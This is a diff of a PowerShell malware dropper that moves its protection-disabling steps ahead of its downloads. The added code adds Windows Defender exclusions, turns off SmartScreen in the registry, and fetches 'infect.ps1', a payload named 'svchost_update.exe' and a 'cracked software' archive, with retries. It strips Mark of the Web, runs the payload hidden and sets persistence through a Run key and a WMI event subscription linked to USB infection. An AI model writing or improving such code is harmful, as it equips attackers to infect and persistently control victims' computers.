@@ -30,108 +30,7 @@ if (Is-Admin) {
     Add-Content -Path $logPath -Value "[$(Get-Date)] WARNING: Script is NOT running with Administrator privileges."
 }
 
-# Consolidated download logic for all payloads
-Add-Content -Path $logPath -Value "[$(Get-Date)] Starting download checks for all payloads..."
-
-# Download infector.ps1 if it doesn't exist
-if (-not (Test-Path -Path $infectorScriptPath)) {
-    try {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 not found at $infectorScriptPath. Downloading from $infectorUrl..."
-        $infectorResponse = Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 downloaded to $infectorScriptPath."
-        if (-not (Test-Path -Path $infectorScriptPath)) {
-            throw "Downloaded infect.ps1 not found at $infectorScriptPath."
-        }
-        if ([System.IO.Path]::GetExtension($infectorScriptPath).ToLower() -ne ".ps1") {
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded infect.ps1 does not have .ps1 extension."
-        }
-        Unblock-File -Path $infectorScriptPath -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $infectorScriptPath"
-    } catch {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download infect.ps1: $($_.Exception.Message)"
-    }
-} else {
-    Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 already exists at $infectorScriptPath. Skipping download."
-}
-
-# Download svchost_update.exe if it doesn't exist
-if (-not (Test-Path -Path $payloadPath)) {
-    try {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe not found at $payloadPath. Downloading from $payloadUrl..."
-        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] EXE payload downloaded to $payloadPath."
-        if (-not (Test-Path -Path $payloadPath)) {
-            throw "Downloaded file not found at $payloadPath."
-        }
-        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded file does not have .exe extension."
-        }
-        Unblock-File -Path $payloadPath -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $payloadPath."
-    } catch {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download svchost_update.exe: $($_.Exception.Message)"
-    }
-} else {
-    Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe already exists at $payloadPath. Skipping download."
-}
-
-# Download and extract WindowsServices if it doesn't exist
-if (-not (Test-Path -Path $crackedSoftwareFolder)) {
-    try {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder not found at $crackedSoftwareFolder. Downloading from $crackedSoftwareZipUrl..."
-        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Update package downloaded to $crackedSoftwareZipPath."
-        if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
-            throw "Downloaded zip file not found at $crackedSoftwareZipPath."
-        }
-        Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Extracted update package to $crackedSoftwareFolder."
-        if (-not (Test-Path -Path $crackedSoftwareExe)) {
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
-            throw "Update executable missing."
-        }
-        Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from files in $crackedSoftwareFolder."
-    } catch {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download or extract WindowsServices: $($_.Exception.Message)"
-    }
-} else {
-    Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder already exists at $crackedSoftwareFolder."
-    if (-not (Test-Path -Path $crackedSoftwareExe)) {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
-    }
-}
-
-# Execute svchost_update.exe if it exists
-if (Test-Path -Path $payloadPath) {
-    Add-Content -Path $logPath -Value "[$(Get-Date)] Existing svchost_update.exe found at $payloadPath."
-    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
-        try {
-            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Existing payload executed successfully."
-        } catch {
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to execute payload: $($_.Exception.Message)"
-        }
-    } else {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Existing file at $payloadPath is not an .exe."
-    }
-}
-
-Add-Content -Path $logPath -Value "[$(Get-Date)] Attempting to disable SmartScreen..."
-try {
-    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
-    Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
-    Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen disabled successfully."
-    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
-    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Confirmed: SmartScreen is disabled."
-    } else {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
-    }
-} catch {
-    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to disable or check SmartScreen: $($_.Exception.Message)"
-}
-
+# Check and add Windows Defender exclusions first
 Add-Content -Path $logPath -Value "[$(Get-Date)] Waiting for Windows Defender service to be fully ready..."
 $maxAttempts = 20
 $delayBetweenChecks = 5
@@ -230,6 +129,136 @@ foreach ($excl in $exclusionsExtensions) {
     }
 }
 
+# Check and disable SmartScreen if not already disabled
+Add-Content -Path $logPath -Value "[$(Get-Date)] Attempting to disable SmartScreen..."
+try {
+    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
+    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen is already disabled."
+    } else {
+        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
+        Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen disabled successfully."
+        $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
+        if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Confirmed: SmartScreen is disabled."
+        } else {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
+        }
+    }
+} catch {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to disable or check SmartScreen: $($_.Exception.Message)"
+}
+
+# Download payloads only after exclusions and SmartScreen
+$retryCount = 3
+Add-Content -Path $logPath -Value "[$(Get-Date)] Starting download checks for all payloads..."
+
+# Download infector.ps1 if it doesn't exist
+if (-not (Test-Path -Path $infectorScriptPath)) {
+    for ($i = 0; $i -lt $retryCount; $i++) {
+        try {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Downloading infect.ps1 from $infectorUrl..."
+            Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 downloaded to $infectorScriptPath."
+            if (-not (Test-Path -Path $infectorScriptPath)) {
+                throw "Downloaded infect.ps1 not found at $infectorScriptPath."
+            }
+            if ([System.IO.Path]::GetExtension($infectorScriptPath).ToLower() -ne ".ps1") {
+                Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded infect.ps1 does not have .ps1 extension."
+            }
+            Unblock-File -Path $infectorScriptPath -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $infectorScriptPath"
+            break
+        } catch {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Failed to download infect.ps1: $($_.Exception.Message)"
+            if ($i -eq ($retryCount - 1)) {
+                Add-Content -Path $logPath -Value "[$(Get-Date)] Max retries reached for infect.ps1 download."
+            }
+            Start-Sleep -Seconds 2
+        }
+    }
+} else {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 already exists at $infectorScriptPath. Skipping download."
+}
+
+# Download svchost_update.exe if it doesn't exist
+if (-not (Test-Path -Path $payloadPath)) {
+    for ($i = 0; $i -lt $retryCount; $i++) {
+        try {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Downloading svchost_update.exe from $payloadUrl..."
+            Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] EXE payload downloaded to $payloadPath."
+            if (-not (Test-Path -Path $payloadPath)) {
+                throw "Downloaded file not found at $payloadPath."
+            }
+            if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
+                Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded file does not have .exe extension."
+            }
+            Unblock-File -Path $payloadPath -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $payloadPath."
+            break
+        } catch {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Failed to download svchost_update.exe: $($_.Exception.Message)"
+            if ($i -eq ($retryCount - 1)) {
+                Add-Content -Path $logPath -Value "[$(Get-Date)] Max retries reached for svchost_update.exe download."
+            }
+            Start-Sleep -Seconds 2
+        }
+    }
+} else {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe already exists at $payloadPath. Skipping download."
+}
+
+# Download and extract WindowsServices if it doesn't exist
+if (-not (Test-Path -Path $crackedSoftwareFolder)) {
+    for ($i = 0; $i -lt $retryCount; $i++) {
+        try {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Downloading WindowsServices from $crackedSoftwareZipUrl..."
+            Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Update package downloaded to $crackedSoftwareZipPath."
+            if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
+                throw "Downloaded zip file not found at $crackedSoftwareZipPath."
+            }
+            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Extracted update package to $crackedSoftwareFolder."
+            if (-not (Test-Path -Path $crackedSoftwareExe)) {
+                Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
+                throw "Update executable missing."
+            }
+            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from files in $crackedSoftwareFolder."
+            break
+        } catch {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Attempt $($i+1): Failed to download or extract WindowsServices: $($_.Exception.Message)"
+            if ($i -eq ($retryCount - 1)) {
+                Add-Content -Path $logPath -Value "[$(Get-Date)] Max retries reached for WindowsServices download."
+            }
+            Start-Sleep -Seconds 2
+        }
+    }
+} else {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder already exists at $crackedSoftwareFolder."
+    if (-not (Test-Path -Path $crackedSoftwareExe)) {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
+    }
+}
+
+# Execute svchost_update.exe if it exists
+if (Test-Path -Path $payloadPath) {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] Existing svchost_update.exe found at $payloadPath."
+    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
+        try {
+            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Existing payload executed successfully."
+        } catch {
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to execute payload: $($_.Exception.Message)"
+        }
+    } else {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Existing file at $payloadPath is not an .exe."
+    }
+}
+
 Add-Content -Path $logPath -Value "[$(Get-Date)] Checking registry key for persistence..."
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -259,7 +288,7 @@ try {
     # Check if WMI filter and consumer already exist
     $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'"
     $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
-    $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""
+    $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$USBInfectionConsumer'"""
 
     if ($existingFilter -and $existingConsumer -and $existingBinding) {
         Add-Content -Path $logPath -Value "[$(Get-Date)] WMI event subscription already exists: $filterName, $consumerName"
